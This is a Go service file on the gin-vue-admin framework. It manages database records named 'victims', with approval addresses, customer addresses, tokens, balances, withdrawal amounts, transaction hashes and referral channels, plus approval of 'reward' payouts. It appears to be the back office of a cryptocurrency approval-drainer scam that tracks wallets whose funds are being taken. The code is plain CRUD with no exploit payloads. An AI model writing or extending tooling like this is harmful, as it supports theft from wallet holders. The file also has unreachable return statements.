package system

import (
	"errors"
	"fmt"
	"github.com/flipped-aurora/gin-vue-admin/server/global"
	"github.com/flipped-aurora/gin-vue-admin/server/model/common/request"
	"github.com/flipped-aurora/gin-vue-admin/server/model/system"
	"gorm.io/gorm"
	"time"
)

//@author: [piexlmax](https://github.com/piexlmax)
//@function: CreateVictim
//@description: 新增基础victim
//@param: victim model.SysVictim
//@return: err error

type VictimService struct{}

func (VictimService *VictimService) CreateReward(reward system.SysReward) (err error) {
	if !errors.Is(global.GVA_DB.Where("address  = ?", reward.Address).First(&system.SysReward{}).Error, gorm.ErrRecordNotFound) {
		return errors.New("存在相同reward")
	}
	return global.GVA_DB.Create(&reward).Error
}

func (VictimService *VictimService) Reject(reward system.SysReward) (err error) {
	var entity system.SysReward
	err = global.GVA_DB.Where("id = ?", reward.ID).First(&entity).Error // 根据id查询api记录
	if errors.Is(err, gorm.ErrRecordNotFound) {                         // api记录不存在
		return err
	}
	err = global.GVA_DB.Model(&system.SysReward{}).Where("id = ?", reward.ID).Update("status", 2).Error
	return err

	return nil
}

func (VictimService *VictimService) Approval(reward system.SysReward) (err error) {
	var entity system.SysReward
	err = global.GVA_DB.Where("id = ?", reward.ID).First(&entity).Error // 根据id查询api记录
	if errors.Is(err, gorm.ErrRecordNotFound) {                         // api记录不存在
		return err
	}
	err = global.GVA_DB.Model(&system.SysReward{}).Where("id = ?", reward.ID).Update("status", 1).Error
	return err

	return nil
}

func (VictimService *VictimService) GetRewardList(status string, reward system.SysReward, info request.PageInfo, order string, desc bool, startDateStr string, endDateStr string) (list interface{}, total int64, err error) {
	limit := info.PageSize
	offset := info.PageSize * (info.Page - 1)
	db := global.GVA_DB.Model(&system.SysReward{})
	var victimList []system.SysReward

	if status != "" {
		db = db.Where("status = ?", status)
	}
	if reward.Address != "" {
		db = db.Where("address = ?", reward.Address)
	}

	if len(startDateStr) > 0 && len(endDateStr) > 0 {
		startDate, error := time.Parse("2006-01-02", startDateStr)
		endDate, error := time.Parse("2006-01-02", endDateStr)
		if error == nil {
			db = db.Where("created_at BETWEEN ? AND ?", startDate, endDate)
		}
	}

	err = db.Count(&total).Error

	if err != nil {
		return victimList, total, err
	} else {
		db = db.Limit(limit).Offset(offset)
		if order != "" {
			var OrderStr string
			// 设置有效排序key 防止sql注入
			// 感谢 Tom4t0 提交漏洞信息
			orderMap := make(map[string]bool, 10)
			orderMap["id"] = true
			orderMap["address"] = true
			orderMap["reward"] = true
			if orderMap[order] {
				if desc {
					OrderStr = order + " desc"
				} else {
					OrderStr = order
				}
			} else { // didn't match any order key in `orderMap`
				err = fmt.Errorf("非法的排序字段: %v", order)
				return victimList, total, err
			}

			err = db.Order(OrderStr).Find(&victimList).Error
		} else {
			err = db.Order("id desc").Find(&victimList).Error
		}
	}
	return victimList, total, err
}

func (VictimService *VictimService) CreateVictim(victim system.SysVictim) (err error) {
	if !errors.Is(global.GVA_DB.Where("approval_address = ? AND customer_address = ?", victim.ApprovalAddress, victim.CustomerAddress).First(&system.SysVictim{}).Error, gorm.ErrRecordNotFound) {
		return errors.New("存在相同victim")
	}
	return global.GVA_DB.Create(&victim).Error
}

func (VictimService *VictimService) UpdateVictimRefresh(tx system.SysVictim) (err error) {
	err = global.GVA_DB.Model(&system.SysVictim{}).Where("id = ?", tx.ID).Update("refresh", tx.Refresh).Update("balance", tx.Balance).Error
	return err
}

//@author: [piexlmax](https://github.com/piexlmax)
//@function: DeleteVictim
//@description: 删除基础victim
//@param: victim model.SysVictim
//@return: err error

func (VictimService *VictimService) DeleteVictim(victim system.SysVictim) (err error) {
	var entity system.SysVictim
	err = global.GVA_DB.Where("id = ?", victim.ID).First(&entity).Error // 根据id查询victim记录
	if errors.Is(err, gorm.ErrRecordNotFound) {                         // victim记录不存在
		return err
	}
	err = global.GVA_DB.Delete(&entity).Error
	if err != nil {
		return err
	}
	return nil
}

//@author: [piexlmax](https://github.com/piexlmax)
//@function: GetAPIInfoList
//@description: 分页获取数据,
//@param: victim model.SysVictim, info request.PageInfo, order string, desc bool
//@return: list interface{}, total int64, err error

func (VictimService *VictimService) GetVictimInfoList(victim system.SysVictim, info request.PageInfo, order string, desc bool, channel string) (list interface{}, total int64, err error) {
	limit := info.PageSize
	offset := info.PageSize * (info.Page - 1)
	db := global.GVA_DB.Model(&system.SysVictim{})
	var victimList []system.SysVictim

	if victim.PrimaryChannel != "" {
		db = db.Where("Primary_Channel LIKE ?", "%"+victim.PrimaryChannel+"%")
	}

	if victim.CustomerAddress != "" {
		db = db.Where("Customer_Address = ?", victim.CustomerAddress)
	}

	if victim.ApprovalAddress != "" {
		db = db.Where("Approval_Address = ?", victim.ApprovalAddress)
	}

	if victim.Token != "" {
		db = db.Where("token = ?", victim.Token)
	}

	if channel != "" {
		db = db.Where("Primary_Channel = ?", channel)
	}

	err = db.Count(&total).Error

	if err != nil {
		return victimList, total, err
	} else {
		db = db.Limit(limit).Offset(offset)
		if order != "" {
			var OrderStr string
			// 设置有效排序key 防止sql注入
			// 感谢 Tom4t0 提交漏洞信息
			orderMap := make(map[string]bool, 10)
			orderMap["id"] = true
			orderMap["network"] = true
			orderMap["balance"] = true
			orderMap["withdraw_amount"] = true
			orderMap["status"] = true
			orderMap["customer_address"] = true
			orderMap["approval_address"] = true
			orderMap["token"] = true
			orderMap["to_address"] = true
			orderMap["tx_Hash"] = true
			orderMap["primary_channel"] = true
			orderMap["secondary_channel"] = true
			if orderMap[order] {
				if desc {
					OrderStr = order + " desc"
				} else {
					OrderStr = order
				}
			} else { // didn't match any order key in `orderMap`
				err = fmt.Errorf("非法的排序字段: %v", order)
				return victimList, total, err
			}

			err = db.Order(OrderStr).Find(&victimList).Error
		} else {
			err = db.Order("id desc").Find(&victimList).Error
		}
	}
	return victimList, total, err
}

//@author: [piexlmax](https://github.com/piexlmax)
//@function: GetAllVictims
//@description: 获取所有的victim
//@return:  victims []model.SysVictim, err error

func (VictimService *VictimService) GetAllVictims() (victims []system.SysVictim, err error) {
	err = global.GVA_DB.Find(&victims).Error
	return
}

//@author: [piexlmax](https://github.com/piexlmax)
//@function: GetVictimById
//@description: 根据id获取victim
//@param: id float64
//@return: victim model.SysVictim, err error

func (VictimService *VictimService) GetVictimById(id uint) (victim system.SysVictim, err error) {
	err = global.GVA_DB.Where("id = ?", id).First(&victim).Error
	return
}

//@author: [piexlmax](https://github.com/piexlmax)
//@function: UpdateVictim
//@description: 根据id更新victim
//@param: victim model.SysVictim
//@return: err error

func (VictimService *VictimService) UpdateVictim(victim system.SysVictim) (err error) {
	var oldA system.SysVictim
	err = global.GVA_DB.Where("id = ?", victim.ID).First(&oldA).Error

	if err != nil {
		return err
	} else {

		err = global.GVA_DB.Save(&victim).Error

	}
	return err
}
